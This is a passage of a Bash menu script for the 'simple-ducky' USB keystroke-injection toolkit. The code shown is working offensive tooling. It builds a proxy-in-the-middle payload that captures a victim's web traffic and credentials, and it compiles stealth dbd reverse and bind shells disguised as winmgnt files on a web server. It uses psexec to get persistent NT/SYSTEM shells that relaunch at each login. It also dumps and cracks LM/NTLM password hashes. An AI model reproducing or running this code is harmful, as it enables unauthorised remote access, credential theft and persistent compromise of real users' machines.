	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e java -jar -Xmx1024m /usr/bin/burpsuite.jar &
	clear
	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo '1) Select the "Proxy" tab'
	echo ""
	echo '2) Under "Intercept" ensure that "Intercept is off"'
	echo ""
	echo '3) Select the "Options" tab under "Proxy"'
	echo ""
	echo "4) Under "Proxy Listeners" select "Add" to add a new listener"
	echo ""
	echo "5) In the "Bind to port:" radio box put $attackerport"
	echo ""
	echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
	echo ""
	echo "7) Select the "History" tab to view the traffic from the victims machine"
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Proxy in the Middle (PiTM) | no admin needed (Windows 8)
#################################################################################
f_proxyinthemiddleWIN8(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload sets up a proxy server on the vicitims machine. It then launches Burpsuite and allows the attacker to see everything that the victim browses to and it will even hand over the credentials to any website visited."
	echo -e "\e[1;31mNote:\e[0m This payload does not require any admin access. Although, some corporate networks man have policies in place to block normal users from altering the proxy settings."
	echo -e "\e[1;31mTarget:\e[0m Windows 8"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "What IP/domain would you like to use for your proxy server? " attackerip
	echo ""
	read -p "What port will you be using for your proxy server (example: 8081)? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/simple-ducky/payloads/proxyinthemiddleWIN8.conf > /usr/share/simple-ducky/payload_del.txt
	sed "/STRING/s/attackerport/$attackerport/g" /usr/share/simple-ducky/payload_del.txt > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mLaunching Burp Suite...\e[0m" 
	echo ""
	sleep 2
	x-terminal-emulator -e java -jar -Xmx1024m /usr/bin/burpsuite.jar &
	clear
	echo -e "\e[1;34mSet the following options in Burp Suite...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo '1) Select the "Proxy" tab'
	echo ""
	echo '2) Under "Intercept" ensure that "Intercept is off"'
	echo ""
	echo '3) Select the "Options" tab under "Proxy"'
	echo ""
	echo '4) Under "Proxy Listeners" select "Add" to add a new listener'
	echo ""
	echo "5) In the "Bind to port:" radio box put $attackerport"
	echo ""
	echo "6) Click the "Specific address:" radio button and select $attackerip / the attacking machines IP address"
	echo ""
	echo '7) Select the "History" tab to view the traffic from the victims machine'
	echo ""
	read -p "Press any key to contiue" enter
	xdg-open /usr/share/simple-ducky/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Misc Options (Cleanup, JAVA update & Password Hasher)
#
#################################################################################
#################################################################################

#################################################################################
# Directoy Cleanup
#################################################################################
f_cleanup(){
	clear
	echo -e "\e[1;34mRemoving old files..."
	sleep 1
	rm *.txt
	rm *.bin
	rm *.html
	clear
	echo -e "\e[1;34mDone! Returning to the main menu."
	sleep 2
	simple-ducky 
}

#################################################################################
# FTP Server Setup
#################################################################################
f_ftpsetup(){
	clear
	echo -e "\e[1;34mWhat would you like to do?\e[0m"
	echo ""
	echo "1. Initial Pure-FTPD setup"
	echo "2. Add a new user to the server"
	echo ""
	echo ""
	echo -e "\e[1;31mNote:\e[0m The initial setup is done during the installation process."
	echo ""
	read -p "Option: " option
	
	if [ "$option" == "1" ]; then
		clear
		echo -e "\e[1;34mLets start setting up your pure-ftpd server\e[0m"
		echo ""
		read -p "[-] Who would you like the primary user to be? " ftpusername
		echo ""
		echo -e "\e[1;33m[-] Configuring pure-FTPD for: $ftpusername\e[0m"
		echo ""
		sleep 3
		groupadd ftpgroup
		useradd -g ftpgroup -d /dev/null -s /etc ftpuser
		echo -e "\e[1;33m[-] Please set the password for $ftpusername.\e[0m"
		pure-pw useradd $ftpusername -u ftpuser -d /ftphome
		pure-pw mkdb
		cd /etc/pure-ftpd/auth/
		ln -s ../conf/PureDB 60pdb
		echo ""
		echo -e "\e[1;33m[-] Creating your home directory, it will reside at /ftphome/\e[0m"
		echo ""
		sleep 3
		mkdir /ftphome
		chown -R ftpuser:ftpgroup /ftphome/
		echo -e "\e[1;33m[-] Starting the FTP server.\e[0m"
		echo ""
		sleep 2
		service pure-ftpd restart
		echo ""
		echo -e "\e[1;32m[+] Done! To test your new account, in a new terminal type: ftp 127.0.0.1\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else
		clear
		read -p "Who would you like to add to the FTP server? " ftpusername
		pure-pw useradd $ftpusername -u ftpuser -d /ftphome
		pure-pw mkdb
		echo ""
		echo -e "\e[1;34mRestarting the FTP server.\e[0m"
		echo ""
		sleep 3
		service pure-ftpd restart
		clear
		echo -e "\e[1;34mDone! To test your new account, in a new terminal type: ftp 127.0.0.1\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
		simple-ducky
	fi
}

#################################################################################
# LM/NTLM Password Hasher
#################################################################################
f_lmntlmhasher(){
	clear
	echo -e "\e[1;31mDescription:\e[0m LM/NTLM Password Hasher..."
	echo -e "\e[1;31mNote:\e[0m If you used the 'LM/NTLM Hash Dump From Live System' payload make sure you extract the .zip files first."
	echo ""
	echo ""
	read -p "Would you like me to extract the encrypted zip files [y|n]? " extract
	echo ""
	if [ "$extract" == "y" ]; then
		read -p "What is the password for the encrypted zip files? " zippass
		echo ""
	else
		echo ""
	fi
	echo "What is the path of the SAM & SYSTEM files, make sure you specify the complete path?"
	echo ""
	read -p "[Example: /ftphome/ (default ftp directory) or /root/Desktop/] " hashpath
	clear
	if [ "$extract" == "y" ]; then
		echo -e "\e[1;34mExtracting the zip files...\e[0m"
		sleep 3
		echo ""
		cd $hashpath
		7za x SAM.zip -p$zippass
		7za x SYSTEM.zip -p$zippass
		7za x ntds.zip -p$zippass
		echo ""
	else
		echo ""
	fi
	echo -e "\e[1;34mMerging the SAM & SYSTEM files\e[0m"
	sleep 3
	echo ""
	cd $hashpath
	bkhive SYSTEM pass.txt
	samdump2 SAM pass.txt > hash.txt
	rm pass.txt
	echo ""
	clear
	echo -e "\e[1;34mDone! Here's your LM/NTLM hashes...\e[0m"
	echo ""
	cat hash.txt
	echo ""
	echo -e "\e[1;34mThe fastest way to crack these hashes is with Rainbow Tables...\e[0m"
	echo -e "\e[1;34mOn-line Rainbow Table:\e[0m http://www.md5decrypter.co.uk/ntlm-decrypt.aspx"
	echo ""
	echo -e "\e[1;34mOr if you would like, I can launch John to attempt to crack the hashes...\e[0m"
	read -p "Would you like me to launch John [y|n]? " launchjohn
	clear
	if [ "$launchjohn" == "y" ]; then
		x-terminal-emulator -e john hash.txt --format=nt2 &
		read -p "Would you like to return to the main menu [y/n]? " option
	else
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Site2lst Custom Wordlist Builder
#################################################################################
f_site2lst(){
	clear
	echo -e "\e[1;31mSite2Lst Custom Wordlist Builder\e[0m"
	echo "This function clones any website you would like and builds a custom wordlist based on the words extracted."
	echo -e "\e[1;31mOrignal Concept by:\e[0m PaulDotCom"
	echo -e "\e[1;31mPaulDotCom Article:\e[0m http://pauldotcom.com/2008/11/creating-custom-wordlists-for.html"
	echo -e "\e[1;31mScript Assembled by:\e[0m Travis Weathers (skysploit) | skysploit@gmail.com"
	echo ""
	echo -e "\e[1;34mWhere do you want to store the password list?\e[0m"
	echo -e "\e[1;34mDefine the full path [i.e. /root/Desktop or /usr/share/wordlists]\e[0m"
	echo ""
	read -p "Path: " newpath
	echo ""
	echo""
	echo -e "\e[1;34mWhat is the target website [Example: www.example.com]?\e[0m"
	echo""
	read -p "Target Website: " targetsite
	echo ""
	echo""
	echo -e "\e[1;34mHow many levels deep would you like to go [Example: 2 | this will clone the first two directories of the website]?\e[0m"
	echo""
	read -p "Number of directories: " directoryscan
	echo ""
	echo""
	echo -e "\e[1;34mWhat would you like to name the wordlist [Example: example.lst]?\e[0m"
	echo ""
	read -p "Wordlist name: " lstname
	echo""
	echo -e "\e[1;34mWould you like to merge your password list with the default John the Ripper list?\e[0m"
	echo""
	read -p "[y|n]: " mergelst
	clear
	mkdir $newpath/wordlist/
	cd $newpath/wordlist/
	clear
	echo -e "\e[1;34m[+] Cloning $targetsite, this may take a while...\e[0m"
	sleep 3
	echo ""
	wget -r -l $directoryscan $targetsite
	echo ""
	echo -e "\e[1;32m[+] The cloning process has finished.\e[0m"
	sleep 3
	clear
	echo -e "\e[1;34m[+] Replacing spaces with new line characters to produce a unique list...\e[0m"
	sleep 3
	grep -hr "" $targetsite/ | tr '[:space:]' '\n' | sort | uniq > wordlist.lst
	echo ""
	echo ""
	echo -e "\e[1;34m[+] Removing odd characters (mainly HTML tags)...\e[0m"
	sleep 3
	egrep -v '('\,'|'\;'|'\}'|'\{'|'\<'|'\>'|'\:'|'\='|'\"'|'\/'|'\/'|'\['|'\]')' wordlist.lst | sort -u > wordlist.clean.lst
	sed 's/[)(]//g' wordlist.clean.lst > wordlist.clean2.lst
	if [ "$mergelst" == "y" ]; then
		echo ""
		echo ""
		echo -e "\e[1;34m[+] Merging our wordlist with the default John the Ripper list....\e[0m"
		sleep 3
		cp /usr/share/john/password.lst password.lst
		cat password.lst >> wordlist.clean2.lst
		rm password.lst
		echo ""
		echo ""
	else
		echo ""
		echo ""
	fi
	echo -e "\e[1;34m[+] Applying some rules and finializing the output...\e[0m"
	sleep 3
	echo""
	john --wordlist=wordlist.clean2.lst --rules --stdout | uniq > $lstname
	echo ""
	echo -e "\e[1;34m[+] Cleaning up our mess...\e[0m"
	sleep 3
	rm wordlist.clean2.lst
	rm wordlist.clean.lst
	rm wordlist.lst
	rm -rf $targetsite/
	echo ""
	echo ""
	echo -e "\e[1;32m[+] Done! your new list is located here: $newpath/wordlist/$lstname\e[0m"
	sleep 3
	nautilus $newpath/wordlist/ &&
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	clear
	f_mainmenu
}

#################################################################################
#################################################################################
#
# Advanced Features
#
#################################################################################
#################################################################################


#################################################################################
# Advanced Features
#################################################################################
#f_advancebanner(){
#	clear
#	echo -e "\e[1;31mYou have found the advanced menu!\e[0m "
#	echo -e 'This area is designed for advanced users and developers. Consider this area the "beta" testing section of the simple-ducky. From now on this is where all the R&D will happen.'
#	echo -e "If you would like to submit your work for R&D send it to skysploit@gmail.com"
#	echo -e "\e[1;31mNote:\e[0m Have fun with the features while you are here. But please don't share how you got to these features in public forums as I do not have time to discuss the functions and extras that may be in this section."
#	echo -e "\e[1;31mLast R&D Update:\e[0m 13 Jun 2013"
#	echo -e ""
#}

#################################################################################
# Advanced Menu
#################################################################################
#f_advancedmenu(){

#f_advancebanner
#	echo -e "\e[1;34mWhere would you like to start?\e[0m"
#	echo ""
#	echo "1. Durandal Backdoor (Payload only no inject.bin | Works GREAT!)"
#	echo "2. DBD Payload w/inject.bin (NT/SYSTEM Persistent Shell)"
#	echo "3. Custom Payload Builder (Pulls from all the payloads offered by the Simple-Ducky)"
#	echo "4. Install DBD (Required)"
#	echo "5. Return to the Main Menu"
#	echo "6. Quit"
#	echo ""
#	read -p "Option: " option
#
#	case $option in
#	1) f_dbdbuilder ;;
#	2) f_windowsdbdmenu ;;
#	3) f_payloadbuilder ;;
#	4) f_dbdinstaller ;;
#	5) f_mainmenu ;;
#	6) clear;exit ;;
#	*) clear;exit ;;

#	esac

#}

#################################################################################
# DBD Payload Builder
#################################################################################
f_dbdbuilder(){
	clear
	echo -e "\e[1;31mDiscription:\e[0mdbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. dbd supports TCP/IP communication only. Source code and binaries are distributed under the GNU General Public License."
	echo -e "\e[1;31mNote:\e[0m You must install mingw32 to compile DBD executables. This should be done on install but if not, run the 'Dependency Checker' on the Main Menu."
	echo -e "\e[1;31mNote:\e[0m Currently having issues with the bind shell option... It will be addressed in the next update."
	echo -e "\e[1;31mSpecial thanks to:\e[0m Durandal for creating dbd and sharing it with the community."
	echo ""
	echo ""
	echo -e "\e[1;34mWhat kind of payload would you like to build?\e[0m"
	echo ""
	echo "1. Windows DBD Reverse Shell"
	echo "2. Windows DBD Bind Shell (work in progress)"
	echo "3. Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell"
	echo "4. Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell"
	echo "5. Install DBD (Required to receive dbd shells)"
	echo "6. Return to the Main Menu"
	echo "7. Quit"
	echo ""
	read -p "Option: " option
	
	 
	if [ "$option" == "1" ]; then
		clear
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.exe
		clear
		#rm dbd.exe
		cd /usr/share/simple-ducky
		echo -e "\e[1;34mDone! Your payload is located at /var/www/winmgnt.exe\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
				f_mainmenu
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
				f_mainmenu
			fi
		
	elif [ "$option" == "2" ]; then
		clear
		read -p "What port would you like the victim be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_bind_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.exe
		clear
		#rm dbd.exe
		cd /usr/share/simple-ducky
		echo -e "\e[1;34mDone! Your payload is located at /var/www/winmgnt.exe\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		f_mainmenu	
	elif [ "$option" == "3" ]; then
		clear
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_unix_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_unix_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make unix
		chmod +x dbd
		cp /usr/share/simple-ducky/misc/dbd/dbd /var/www/...
		#rm dbd
		clear
		cd /usr/share/simple-ducky
		echo -e "\e[1;34mDone! Your payload is located at /var/www/...\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
				f_mainmenu
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
				f_mainmenu
			fi
			
	elif [ "$option" == "4" ]; then
		clear
		read -p "What port would you like the victim be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_unix_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_unix_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_unix_bind1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_unix_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make unix
		chmod +x dbd
		cp /usr/share/simple-ducky/misc/dbd/dbd /var/www/...
		#rm dbd
		clear
		cd /usr/share/simple-ducky
		echo -e "\e[1;34mDone! Your payload is located at /var/www/...\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		f_mainmenu	
	elif [ "$option" == "5" ]; then
		clear
		f_dbdinstaller
	elif [ "$option" == "6" ]; then
		clear
		f_mainmenu
	elif [ "$option" == "7" ]; then
		clear;exit
	else
		f_dbdbuilder
	fi
}

#################################################################################
# Windows DBD Menu
#################################################################################
f_windowsdbdmenu(){
	clear
	echo -e "\e[1;34mWhere would you like to start?\e[0m"
	echo ""
	echo "1. Windows DBD Reverse/Bind Shell (NT/SYSTEM Shell|Win Vista/7) w/UAC"
	echo "2. Windows DBD Reverse/Bind Shell (NT/SYSTEM Shell|Windows 8) w/UAC"
	echo "3. Return to the Advanced Menu"
	echo "4. Quit"
	echo ""
	read -p "Option: " option
	
	if [ "$option" == "1" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsdbdVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsdbdVIS7nouac
		fi
	elif [ "$option" == "2" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsdbdWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsdbdWIN8nouac
		fi
	elif [ "$option" == "3" ]; then
		f_advancedmenu
	elif [ "$option" == "4" ]; then
		clear;exit
	elif [ "$option" == "*" ]; then
		clear;exit
fi

}

#################################################################################
# DBD Installer
#################################################################################
f_dbdinstaller(){
	clear
	echo -e "\e[1;34mPlease wait while I install DBD on your machine...\e[0m"
	echo ""
	sleep 3
	cp /usr/share/simple-ducky/misc/dbd/conf/dbd_defaults.conf /usr/share/simple-ducky/misc/dbd/dbd.h
	cd /usr/share/simple-ducky/misc/dbd/
	make unix
	chmod +x dbd
	cp dbd /usr/share/simple-ducky/misc/dbd/binaries/
	mv dbd /usr/bin/
	cd /usr/share/simple-ducky/
	echo "" 
	echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
	echo ""
	sleep 3
	f_mainmenu
}

#################################################################################
# DBD Shell w/UAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_windowsdbdVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses a custom dbd executable (bind/reverse shell) and psexec to give the attacker a persistent shell with NT/SYSTEM ACCESS!! DBD uses a 128bit secure connection! In addition a task is scheduled to relaunch the shell every time a new user logs in. "
	echo -e "\e[1;31mNote:\e[0m Special thanks to durandal for developing dbd and helping me fine tune this incredible fast and powerful payload"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit "
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Would you like a reverse or bind shell [rev|bind]? " payloadtype
	echo ""
	if [ "$payloadtype" == "rev" ]; then
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/attackerip/$attackerip/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_reverse.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse1.conf
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_reverse2.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky
	elif [ "$payloadtype" == "bind" ]; then 
		read -p "What port do you want the victim to be listening on? " victimport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
		echo -e "\e[1;34mBuilding your custom dbd payload, this will take a moment...\e[0m"
		sleep 3 
		sed "/HOST/s/victimport/$victimport/g" /usr/share/simple-ducky/misc/dbd/conf/dbd_win_bind.conf > /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf > /usr/share/simple-ducky/misc/dbd/dbd.h
		rm /usr/share/simple-ducky/misc/dbd/dbd_win_bind1.conf
		cd /usr/share/simple-ducky/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp /usr/share/simple-ducky/misc/dbd/dbd.exe /var/www/winmgnt.txt
		cp /usr/share/simple-ducky/misc/psexec.exe /var/www/taskmgnt.txt
		rm dbd.exe
		cd /usr/share/simple-ducky	
	fi		
	echo -e ""
	echo -e "\e[1;34mDone!\e[0m"
    sleep 3
    clear
	echo -e "\e[1;34mNow let's build your inject.bin\e[0m"
	echo ""
	echo -e "\e[1;34mWhat is the IP/Domain address for your webserver?\e[0m" 
	read -p "[Example: www.example.com | www.example.com:port | 192.168.1.100 ] " webserverip
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mPlease wait, generating your inject.bin\e[0m"
	echo ""
	sed "/http/s/domain/$webserverip/g" /usr/share/simple-ducky/payloads/windowsdbdVIS7uac.conf > /usr/share/simple-ducky/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
	rm /usr/share/simple-ducky/payload_del1.conf
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter		
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/simple-ducky\e[0m"
		echo ""
		echo -e "\e[1;34mYour evil executable has been created, it is in located at /var/www/winmgmt.exe\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	fi 	
	clear
	
	
	if [ "$payloadtype" == "rev" ]; then
		read -p "Would you like me to setup a listener [y/n]? " listener
		clear
			if [ "$listener" == "n" ]; then
				read -p "Would you like to return to the main menu [y/n]? " option
			elif [ "$listener" == "y" ]; then
				xdg-open /usr/share/simple-ducky/ &
				service apache2 start
				clear
				chmod +x /usr/share/simple-ducky/misc/dbd/binaries/dbd
				cp /usr/share/simple-ducky/misc/dbd/binaries/dbd /usr/bin/dbd
				dbd -lvp $attackerport -k $attackersecret
			fi	
	elif [ "$payloadtype" == "bind" ]; then 
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip $victimport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
		read -p "Would you like to return to the main menu [y/n]? " option 	
	fi		
		
		
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac
}

#################################################################################
# DBD Shell w/oUAC (Admin Priv Shell|Win Vista/7)
#################################################################################
f_windowsdbdVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload uses a custom dbd executable (bind/reverse shell) and psexec to give the attacker a persistent shell with NT/SYSTEM ACCESS!! DBD uses a 128bit secure connection! In addition a task is scheduled to relaunch the shell every time a new user logs in. "
	echo -e "\e[1;31mNote:\e[0m Special thanks to durandal for developing dbd and helping me fine tune this incredible fast and powerful payload"
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m skysploit "
	echo ""
	echo ""
	echo -e "\e[1;34mLets start by building your evil executable\e[0m"
	echo ""
	read -p "Would you like a reverse or bind shell [rev|bind]? " payloadtype
	echo ""
	if [ "$payloadtype" == "rev" ]; then
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
	
